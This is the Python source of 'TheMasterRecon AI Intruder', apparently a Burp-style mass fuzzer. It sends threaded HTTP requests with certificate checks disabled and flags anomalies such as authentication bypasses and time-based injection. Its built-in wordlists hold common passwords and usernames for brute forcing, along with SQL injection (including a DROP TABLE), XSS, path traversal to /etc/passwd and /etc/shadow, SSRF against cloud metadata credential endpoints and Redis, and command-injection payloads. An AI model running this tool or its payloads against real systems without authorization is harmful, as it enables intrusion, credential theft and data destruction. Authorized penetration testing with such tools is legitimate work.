"""
TheMasterRecon AI — Intruder (Burp-style mass fuzzer) v2
Sniper, Battering Ram, Pitchfork, Cluster Bomb attack modes.
Real-time anomaly detection + grep matching + regex extraction.
"""
import re, time, logging, urllib.parse, ssl, urllib.request, json
from typing import List, Dict, Optional, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed

log = logging.getLogger("elite.intruder")

ATTACK_MODES = {
    "sniper":       "Single payload position, iterate through wordlist",
    "battering_ram":"All positions get same payload simultaneously",
    "pitchfork":    "Multiple positions, one wordlist each, iterated in parallel",
    "cluster_bomb": "Multiple positions, all combinations (cartesian product)",
}

BUILTIN_WORDLISTS = {
    "passwords": [
        "password","123456","admin","password123","letmein","qwerty","abc123",
        "monkey","1234567","dragon","master","iloveyou","sunshine","princess",
        "welcome","shadow","superman","michael","password1","123456789",
        "football","charlie","aa123456","donald","password2","qwerty123",
        "admin123","adminadmin","root","toor","pass","test","guest","demo",
        "changeme","secret","p@ssw0rd","P@ssw0rd","P@$$w0rd","abc@123",
    ],
    "usernames": [
        "admin","administrator","root","user","test","guest","demo","info",
        "support","webmaster","sysadmin","mysql","oracle","postgres","ftp",
        "www","web","api","dev","backup","mail","email","sa","dba",
    ],
    "dirs": [
        "admin","login","panel","dashboard","api","upload","backup","config",
        "test","dev","staging","old","beta","v1","v2","manager","control",
        "wp-admin","phpmyadmin","admin.php","login.php","manager","console",
        ".git","env","robots.txt",".env","debug","trace","actuator","swagger",
        "api-docs","graphql","console","shell","cmd","exec","run","server-status",
    ],
    "params": [
        "id","user","username","email","password","token","key","secret",
        "file","path","url","page","action","debug","admin","role","type",
        "cmd","exec","redirect","next","return","callback","ref","source",
        "q","search","query","input","data","xml","json","lang","locale",
    ],
    "sqli": [
        "'","''","\' OR \'1\'=\'1","\' OR 1=1--","\' OR 1=1#",
        "1 AND 1=1","1 AND 1=2","\' UNION SELECT 1--",
        "1; DROP TABLE users--","\' OR SLEEP(5)--","1; WAITFOR DELAY \'0:0:5\'--",
        "1\' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
        "\' OR 1=1 LIMIT 1--","admin\'--","admin\'#","1 OR 1=1",
    ],
    "xss": [
        "<script>alert(1)</script>","<img src=x onerror=alert(1)>",
        "javascript:alert(1)","'><script>alert(1)</script>","{{7*7}}",
        "<svg onload=alert(1)>","<body onload=alert(1)>",
        "\"><img src=x onerror=alert(document.domain)>",
        "<iframe src=javascript:alert(1)>","<details open ontoggle=alert(1)>",
    ],
    "lfi": [
        "../etc/passwd","../../etc/passwd","../../../etc/passwd",
        "....//....//etc/passwd","....//....//....//etc/passwd",
        "..%2Fetc%2Fpasswd","..%252Fetc%252Fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd","/etc/shadow","/proc/self/environ","/proc/self/cmdline",
        "C:\\windows\\win.ini","..\\..\\windows\\win.ini",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1/admin","http://localhost/","file:///etc/passwd",
        "gopher://127.0.0.1:6379/_FLUSHALL","dict://127.0.0.1:6379/info",
    ],
    "rce": [
        "; id","; whoami","| id","| whoami","|| id","& id","&& id",
        "`id`","$(id)","; sleep 5","| sleep 5","; ping -c1 127.0.0.1",
        "%0aid","%0a whoami","\nid","\n whoami",
        "; /bin/cat /etc/passwd","\'; id; \'",
    ],
}


def _ssl():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def _send(method: str, url: str, headers: dict, body: str, timeout: int = 10) -> dict:
    """Send single request, return rich result dict."""
    start = time.time()
    try:
        data = body.encode("utf-8","ignore") if body else None
        h = {k: v for k, v in headers.items()}
        if "User-Agent" not in h:
            h["User-Agent"] = "TheMasterRecon-AI/2.0"
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl()) as r:
            resp_body = r.read().decode("utf-8", "ignore")
            elapsed   = round((time.time() - start) * 1000)
            return {"status": r.status, "length": len(resp_body),
                    "elapsed_ms": elapsed, "body": resp_body[:8000],
                    "headers": dict(r.headers), "error": None}
    except urllib.error.HTTPError as e:
        elapsed = round((time.time() - start) * 1000)
        try: bd = e.read().decode("utf-8", "ignore")
        except: bd = ""
        return {"status": e.code, "length": len(bd), "elapsed_ms": elapsed,
                "body": bd[:3000], "headers": dict(e.headers), "error": None}
    except Exception as e:
        return {"status": 0, "length": 0, "elapsed_ms": round((time.time()-start)*1000),
                "body": "", "headers": {}, "error": str(e)}


def _substitute(template: str, positions: list, payloads: list) -> str:
    """Replace §marker§ with payloads."""
    result = template
    for i, marker in enumerate(positions):
        payload = payloads[i] if i < len(payloads) else ""
        result = result.replace(f"§{marker}§", urllib.parse.quote(str(payload), safe=""), 1)
    return result


def _check_greps(body: str, grep_patterns: list) -> list:
    """Apply grep match patterns to body, return matched patterns."""
    matched = []
    for pattern in grep_patterns:
        try:
            if re.search(pattern, body, re.I):
                matched.append(pattern)
        except Exception:
            pass
    return matched


def _extract_regex(body: str, extract_patterns: dict) -> dict:
    """Extract named regex groups from response body."""
    extracted = {}
    for name, pattern in extract_patterns.items():
        try:
            m = re.search(pattern, body)
            if m:
                extracted[name] = m.group(1) if m.lastindex else m.group(0)
        except Exception:
            pass
    return extracted


def _find_anomalies(results: list, baseline: dict = None) -> list:
    """Find anomalous responses vs baseline."""
    if not results:
        return []
    statuses = [r["status"] for r in results if r.get("status")]
    lengths  = [r["length"] for r in results if r.get("length", 0) > 0]
    times    = [r["elapsed_ms"] for r in results if r.get("elapsed_ms")]

    if not statuses:
        return []

    from collections import Counter
    common_status = Counter(statuses).most_common(1)[0][0]
    avg_len  = sum(lengths) // max(len(lengths), 1)
    avg_time = sum(times) // max(len(times), 1)

    anomalies = []
    for r in results:
        flags = []
        if r.get("status") and r["status"] != common_status:
            flags.append(f"status={r['status']} (baseline={common_status})")
        if r.get("length") and avg_len > 0 and abs(r["length"] - avg_len) > max(avg_len * 0.3, 150):
            flags.append(f"length={r['length']} (avg={avg_len})")
        if r.get("elapsed_ms", 0) > avg_time * 3 + 2000:
            flags.append(f"time={r['elapsed_ms']}ms (avg={avg_time}ms, possible time-based injection)")
        if r.get("grep_matched"):
            flags.append(f"grep match: {r['grep_matched']}")
        if r.get("extracted"):
            flags.append(f"extracted: {list(r['extracted'].keys())}")
        if r.get("status") in [200, 201, 202] and common_status in [401, 403, 404]:
            flags.append(f"bypass! got {r['status']} vs baseline {common_status}")
        if flags:
            r2 = dict(r)
            r2["anomaly_flags"] = flags
            anomalies.append(r2)
    return anomalies


def run_intruder(method: str, url_template: str, header_template: str,
                 body_template: str, wordlists: List[List[str]],
                 attack_mode: str = "sniper", threads: int = 10,
                 timeout: int = 10, result_q=None,
                 grep_patterns: list = None,
                 extract_patterns: dict = None,
                 stop_on_match: bool = False) -> dict:
    """
    Run Intruder attack with grep matching and regex extraction.
    url_template/body_template: use §marker§ for injection points.
    grep_patterns: list of regex patterns to match in response bodies.
    extract_patterns: dict of {name: regex} to extract from responses.
    stop_on_match: stop attack on first anomaly/match.
    """
    grep_patterns    = grep_patterns or []
    extract_patterns = extract_patterns or {}
    positions = re.findall(r"§([^§]+)§", url_template + body_template + header_template)
    if not positions:
        return {"error": "No §injection§ positions found in templates"}

    # Build payload sequences
    if attack_mode == "sniper":
        sequences = []
        wl = wordlists[0] if wordlists else BUILTIN_WORDLISTS["params"]
        for pos_idx, pos in enumerate(positions):
            for payload in wl:
                plist = [""] * len(positions)
                plist[pos_idx] = payload
                sequences.append((payload, plist, pos))
    elif attack_mode == "battering_ram":
        wl = wordlists[0] if wordlists else BUILTIN_WORDLISTS["params"]
        sequences = [(p, [p] * len(positions), "all") for p in wl]
    elif attack_mode == "pitchfork":
        min_len   = min(len(w) for w in wordlists) if wordlists else 0
        sequences = []
        for i in range(min_len):
            plist = [wordlists[j][i] if j < len(wordlists) else "" for j in range(len(positions))]
            sequences.append((plist[0], plist, "parallel"))
    elif attack_mode == "cluster_bomb":
        import itertools
        sequences = []
        for combo in itertools.product(*(wordlists or [[""]])):
            plist = list(combo) + [""] * (len(positions) - len(combo))
            sequences.append((combo[0], plist, "combo"))
    else:
        return {"error": f"Unknown attack mode: {attack_mode}"}

    results   = []
    total     = len(sequences)
    done_cnt  = [0]
    _stopped  = [False]

    def _worker(seq):
        if _stopped[0]:
            return None
        payload, plist, pos = seq
        final_url  = _substitute(url_template, positions, plist)
        final_body = _substitute(body_template, positions, plist)
        final_hdr  = _substitute(header_template, positions, plist)

        hdrs = {}
        for line in final_hdr.split("\n"):
            if ":" in line:
                k, v = line.split(":", 1)
                hdrs[k.strip()] = v.strip()
        if "User-Agent" not in hdrs:
            hdrs["User-Agent"] = "TheMasterRecon-AI/2.0"

        resp = _send(method, final_url, hdrs, final_body, timeout)
        result = {
            "payload":      payload,
            "position":     str(pos),
            "payloads":     plist,
            "url":          final_url,
            "status":       resp.get("status"),
            "length":       resp.get("length"),
            "elapsed_ms":   resp.get("elapsed_ms"),
            "error":        resp.get("error"),
            "body_preview": resp.get("body", "")[:300],
            "grep_matched": _check_greps(resp.get("body", ""), grep_patterns),
            "extracted":    _extract_regex(resp.get("body", ""), extract_patterns),
        }
        done_cnt[0] += 1
        pct = round(done_cnt[0] / total * 100)

        if result_q:
            result_q.put({"type": "intruder_result", "result": result, "progress": pct})

        if stop_on_match and (result["grep_matched"] or result["extracted"]):
            _stopped[0] = True

        return result

    with ThreadPoolExecutor(max_workers=min(threads, 30)) as exe:
        futs = [exe.submit(_worker, seq) for seq in sequences]
        for fut in as_completed(futs):
            try:
                r = fut.result()
                if r:
                    results.append(r)
            except Exception as e:
                log.debug(f"intruder worker: {e}")

    anomalies = _find_anomalies(results)
    if result_q:
        result_q.put({"type": "intruder_done", "total": total,
                      "anomalies": len(anomalies),
                      "grep_matches": sum(1 for r in results if r.get("grep_matched"))})

    return {
        "total":       total,
        "results":     results,
        "anomalies":   anomalies,
        "attack_mode": attack_mode,
        "positions":   positions,
        "grep_matches": [r for r in results if r.get("grep_matched")],
    }
